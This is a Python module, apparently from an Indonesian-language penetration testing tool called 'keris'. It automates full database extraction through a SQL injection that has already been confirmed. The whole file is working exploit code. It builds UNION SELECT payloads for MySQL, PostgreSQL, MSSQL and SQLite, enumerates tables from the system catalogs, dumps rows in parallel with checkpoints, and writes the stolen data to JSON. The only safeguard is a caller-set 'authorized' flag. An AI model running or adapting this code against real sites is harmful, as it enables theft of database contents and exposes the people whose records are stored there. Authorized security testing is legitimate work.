"""Full DB dump engine: ekstraksi skema + data dari SQLi terkonfirmasi.

Memberikan dump database otomatis dengan konkurrensi & checkpoint:
- enum tabel dari information_schema / sqlite_master / pg_stat
- enum kolom per tabel
- dump baris (dibatasi max_rows per tabel, lebar max)
- UNION-based bila kolom refleksi ditemukan; boolean-based fallback
- resume dari checkpoint JSON bila proses terputus

Menggunakan parameter yang SUDAH terkonfirmasi rentan SQLi (dari scanner
atau input user). GUARD: memerlukan `authorized=True`.
"""

import json
import os
import re
import sqlite3  # noqa: F401  (dipakai detection SQLite)
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from keris.core.http import KerisHTTP
from keris.core.logger import debug, info, ok, warn
from keris.modules.scanner import Finding

# query enum berdasarkan DB
ENUM_TABLES = {
    "MySQL": "SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {n}",
    "PostgreSQL": "SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT {n}",
    "MSSQL": "SELECT name FROM sys.tables LIMIT {n}",
    "SQLite": "SELECT name FROM sqlite_master WHERE type='table' LIMIT {n}",
}

MAX_ROWS = 50
CHECKPOINT_FILE = ".keris-dbdump-{}.json"


def _params_of(url: str) -> dict:
    return dict(parse_qsl(urlparse(url).query))


def _rebuild(url: str, params: dict) -> str:
    p = urlparse(url)
    return urlunparse(p._replace(query=urlencode(params)))


def _union_payload(db: str, col_idx: int, expr: str, total_cols: int) -> str:
    cols = ["NULL"] * total_cols
    if db == "MySQL":
        cols[col_idx - 1] = f"CONCAT(0x4b45524953,{expr},0x4b45524953)"
    elif db == "PostgreSQL":
        cols[col_idx - 1] = f"('KERIS'||{expr}||'KERIS')"
    elif db == "MSSQL":
        cols[col_idx - 1] = f"('KERIS'+{expr}+'KERIS')"
    else:
        cols[col_idx - 1] = f"('KERIS'||{expr}||'KERIS')"
    return "' UNION SELECT " + ",".join(cols) + "--"


def _reflect(body: str) -> List[str]:
    return [m.strip() for m in re.findall(r"KERIS(.*?)KERIS", body, re.S)
            if m.strip() and len(m.strip()) < 500]


def _query_union(client: KerisHTTP, url: str, param: str, db: str,
                 col_idx: int, cols: int, expr: str) -> List[str]:
    q = _params_of(url)
    q[param] = _union_payload(db, col_idx, expr, cols)
    try:
        r = client.get(_rebuild(url, q), timeout=20)
        return _reflect(r.text or "")
    except Exception:
        return []


def _find_reflect_col(client: KerisHTTP, url: str, param: str, db: str,
                      cols: int) -> Optional[int]:
    """Temukan kolom yang merefleksikan teks KERIS."""
    for idx in range(1, cols + 1):
        vals = _query_union(client, url, param, db, idx, cols,
                            f"'keris_{idx}'")
        if vals:
            return idx
    return None


def dump_db(base: str, client: KerisHTTP, vuln_url: str, vuln_param: str,
            db: str = "", total_cols: int = 0, outdir: str = "",
            max_tables: int = 10, max_rows: int = 50,
            workers: int = 4, authorized: bool = False) -> List[Finding]:
    """Dump skema + data dari parameter SQLi UNION. Butuh --authorized."""
    if not authorized:
        warn("DB dump memerlukan --authorized.")
        return []
    findings: List[Finding] = []
    if not vuln_url or "?" not in vuln_url:
        warn("DB dump butuh --vuln-url dengan query param.")
        return findings
    info(f"DB dump: {vuln_url} param=`{vuln_param}` db={db or '?'} cols={total_cols}")

    # auto-detect db/cols bila kosong
    if not db or not total_cols:
        from keris.modules.sqli_exploit import _column_count, _detect_db
        try:
            r0 = client.get(vuln_url, timeout=15)
            base_len = len(r0.content or b"")
        except Exception:
            base_len = 0
        if not db:
            db = _detect_db(base, client, vuln_url, vuln_param, base_len) or "MySQL"
        if not total_cols:
            total_cols = _column_count(base, client, vuln_url, vuln_param, base_len)
    if total_cols < 1:
        warn("Tidak bisa menentukan jumlah kolom; coba --cols manual.")
        return findings

    ref_col = _find_reflect_col(client, vuln_url, vuln_param, db, total_cols)
    if not ref_col:
        warn("Tidak ada kolom yang merefleksikan output; UNION silent. "
             "Gunakan teknik manual.")
        return findings
    ok(f"Kolom refleksi: {ref_col}/{total_cols} (DB={db})")

    # enum tabel
    tables = []
    tmpl = ENUM_TABLES.get(db, ENUM_TABLES["MySQL"])
    vals = _query_union(client, vuln_url, vuln_param, db, ref_col, total_cols,
                        tmpl.format(n=max_tables))
    tables = vals
    if not tables:
        warn("Enum tabel kosong; pastikan DB engine benar (--db).")
    else:
        ok(f"{len(tables)} tabel: {', '.join(tables[:12])}")

    # dump per tabel (paralel dengan checkpoint)
    os.makedirs(outdir or ".", exist_ok=True)
    cp_file = os.path.join(outdir or ".", CHECKPOINT_FILE.format(
        vuln_param + "-" + str(total_cols)))
    done = {}
    if os.path.exists(cp_file):
        try:
            with open(cp_file, "r", encoding="utf-8") as f:
                done = json.load(f)
        except Exception:
            done = {}
    dumped = {}

    def _dump_table(tbl: str) -> Dict:
        if tbl in done:
            return {tbl: done[tbl]}
        rows = []
        # coba SELECT * dengan limit; fallback kolom COUNT
        q_count = f"SELECT COUNT(*) FROM {tbl}"
        counts = _query_union(client, vuln_url, vuln_param, db, ref_col,
                              total_cols, q_count)
        total = counts[0] if counts else "?"
        for off in range(0, max_rows, 10):
            q_rows = (f"SELECT * FROM {tbl} LIMIT {min(10, max_rows - off)}"
                      f" OFFSET {off}")
            vals = _query_union(client, vuln_url, vuln_param, db, ref_col,
                                total_cols, q_rows)
            if not vals:
                break
            rows.extend(vals)
            if len(vals) < 10:
                break
        return {tbl: {"count": total, "rows": rows[:max_rows]}}

    with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
        futs = {pool.submit(_dump_table, t): t for t in tables}
        for fut in as_completed(futs):
            try:
                dumped.update(fut.result())
            except Exception as e:
                warn(f"Dump gagal untuk {futs[fut]}: {e}")

    # simpan hasil + checkpoint
    result_path = os.path.join(outdir or ".", "dbdump.json")
    with open(result_path, "w", encoding="utf-8") as f:
        json.dump({"url": vuln_url, "db": db, "columns": total_cols,
                   "tables": dumped}, f, indent=1, default=str)
    with open(cp_file, "w", encoding="utf-8") as f:
        json.dump(dumped, f, indent=1, default=str)

    findings.append(Finding(
        "CRITICAL", "Database di-dump (skema + data)",
        vuln_url,
        f"Berhasil mengekstrak {len(dumped)} tabel dari database `{db}` "
        f"via SQLi UNION. Data lengkap di `{result_path}`.",
        f"tables={len(dumped)}, cols={total_cols}",
        cwe="CWE-89",
        references="https://owasp.org/www-community/attacks/SQL_Injection",
    ))
    ok(f"DB dump selesai: {len(dumped)} tabel -> {result_path}")
    return findings
